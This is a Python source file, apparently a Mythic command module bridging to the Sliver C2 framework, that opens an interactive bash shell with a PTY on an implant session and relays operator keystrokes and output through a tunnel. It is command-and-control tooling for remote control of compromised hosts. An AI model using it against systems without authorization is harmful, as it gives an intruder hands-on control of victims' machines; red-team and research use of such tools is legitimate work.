from ..SliverRequests import SliverAPI
import asyncio
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from mythic_container.PayloadBuilder import *
from sliver import client_pb2, sliver_pb2, InteractiveSession
from mythic_container.LoggingBase import *
from mythic_container.MythicGoRPC import *


shell_global_dict = {}

class ShellArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class Shell(CommandBase):
    cmd = "shell"
    needs_admin = False
    help_cmd = "shell"
    description = "Interactive Shell"
    version = 1
    author = "Spencer Adolph"
    argument_class = ShellArguments
    attackmapping = []
    supported_ui_features = ['task_response:interactive']

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        # Start an interactive shell

        # Usage:
        # ======
        #   shell [flags]

        # Flags:
        # ======
        # TODO:  -h, --help                 display help
        # TODO:  -y, --no-pty               disable use of pty on macos/linux
        # TODO:  -s, --shell-path string    path to shell interpreter
        # TODO:  -t, --timeout    int       command timeout in seconds (default: 60)

        await create_shell(taskData)

        taskResponse = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
            Completed=True
        )
        return taskResponse

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp


async def create_shell(taskData: PTTaskMessageAllData):
    interact, isBeacon = await SliverAPI.create_sliver_interact(taskData)

    # TODO: make a different beacon payload with that command not listed? (or take this command out manually with rpc?)
    if (isBeacon):
        return None # TODO: throw error and more gracefully handle with (not supported for beacons)
    
    # typed as rpcpb.SliverRPCClient in TS 
    # but here is 'SliverRPCStub' type (python)
    # (confirmed in pwd code which is working)
    _rpc = interact._stub # doing this to match the this._rpc in the client.ts
    request = interact._request # helper function?
    _tunnelStream = _rpc.TunnelData() # line 622 in client.ts (in the connect() function)

    shell_global_dict['interact'] = interact 
    shell_global_dict['tunnel_stream'] = _tunnelStream
    
    tunnel = sliver_pb2.Tunnel(SessionID=interact.session_id) # line 461/462 client.ts
    rpcTunnel = await _rpc.CreateTunnel(tunnel) # line 464

    tunnelId = rpcTunnel.TunnelID # line 468 in client.ts
    tunnelData = sliver_pb2.TunnelData() # line 469 in client.ts
    tunnelData.TunnelID = tunnelId
    tunnelData.SessionID = interact.session_id
    await _tunnelStream.write(tunnelData) # bind tunnel? (line 519 client.ts and tunnels.go#L128)

    shell_global_dict['tunnel_id'] = tunnelId
    shell_global_dict['session_id'] = interact.session_id

    req = sliver_pb2.ShellReq() # line 474 in client.ts
    req.TunnelID = tunnelId
    req.Path = "/bin/bash"
    req.EnablePTY = True
    shell_result = await _rpc.Shell(request(req)) # line 479 in client.ts
    # TODO: send shell_result output to the task, to show which pid it has created / bound to

    async def read_server_data():
        async for data in _tunnelStream:
            await MythicRPC().execute("create_output", task_id=taskData.Task.ID, output=f'{data.Data.decode("utf-8")}\n')

    # TODO: don't let this run forever, keep track of it and stop it when 'exit' or something is called
    asyncio.create_task(read_server_data())

    return tunnel

class InteractiveCommandReader(Log):
    async def new_task(self, msg: LoggingMessage) -> None:
        if (not msg.Data.IsInteractiveTask):
            return

        # TODO: prevent follow up tasks after 'exit'

        # logger.info(msg)

        if msg.Data.DisplayParams == '':
            return
        
        # TODO: check if for this session / task, etc...

        interact = shell_global_dict['interact']
        _tunnelStream = shell_global_dict['tunnel_stream']
        tunnelId = shell_global_dict['tunnel_id']
        sessionId = shell_global_dict['session_id']

        if msg.Data.DisplayParams == 'exit\n':
            # await _tunnelStream.write(b'exit\n')
            closeReq = client_pb2.CloseTunnelReq(TunnelID=tunnelId)
            await interact._stub.CloseTunnel(interact._request(closeReq))
            await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
                TaskID=msg.Data.ID,
                UpdateCompleted=True,
                UpdateStatus="finished",
            ))
            return


        data = sliver_pb2.TunnelData()
        data.TunnelID = tunnelId
        data.SessionID = sessionId

        # TODO: get control characters from InteractiveMessageType
        if msg.Data.InteractiveTaskType != 0:
            data.Data = InteractiveMessageType[msg.Data.InteractiveTaskType][1].to_bytes()
        else:
            data.Data = f"{msg.Data.DisplayParams}".encode('utf-8')
        await _tunnelStream.write(data)
        
        await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
            TaskID=msg.Data.ID,
            UpdateCompleted=True,
            UpdateStatus="success",
        ))

